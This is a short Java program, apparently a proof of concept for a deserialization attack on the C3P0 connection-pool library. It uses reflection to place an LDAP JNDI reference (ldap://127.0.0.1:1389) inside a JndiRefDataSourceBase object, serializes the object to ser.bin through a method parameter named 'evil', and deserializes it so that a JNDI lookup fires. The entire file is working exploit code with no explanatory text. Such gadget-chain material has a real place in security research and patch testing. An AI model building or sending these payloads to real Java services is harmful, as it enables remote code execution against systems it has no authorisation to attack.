package C3P0;

import com.mchange.v2.c3p0.impl.JndiRefDataSourceBase;
import com.mchange.v2.naming.ReferenceIndirector;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.Reference;
import javax.naming.ldap.LdapName;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Hashtable;

public class c3p0_jndi_readobject_ldap {
    public static void main(String[] args) throws Exception {
        Reference ref = new Reference(null);

        Hashtable env = new Hashtable();
        env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.ldap.LdapCtxFactory");
        env.put(Context.SECURITY_AUTHENTICATION,"simple");
        env.put(Context.SECURITY_PRINCIPAL,"dc=example,dc=com");
        env.put(Context.SECURITY_CREDENTIALS, "123456");
        env.put(Context.PROVIDER_URL,"ldap://127.0.0.1:1389");
        Name name = new LdapName("");

        Constructor<?> refconz = ReferenceIndirector.class.getDeclaredClasses()[0].getDeclaredConstructors()[0];
        refconz.setAccessible(true);
        Object refser = refconz.newInstance(ref, null, name, env);


        JndiRefDataSourceBase jndiref = new JndiRefDataSourceBase(false);
        setField(jndiref, "jndiName", refser);

        writeObject(jndiref);
        readObject("ser.bin");
    }

    public static void setField(Object obj, String fieldName, Object newValue) {
        try {
            Class<?> clazz = obj.getClass();
            Field field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(obj, newValue);
        } catch (NoSuchFieldException | IllegalAccessException e) {
            e.printStackTrace();
        }
    }

    public static void writeObject(Object evil) throws IOException {
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"))) {
            oos.writeObject(evil);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static Object readObject(String filename) {
        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename))) {
            return ois.readObject();
        } catch (IOException | ClassNotFoundException e) {
            e.printStackTrace();
            return null;
        }
    }
}
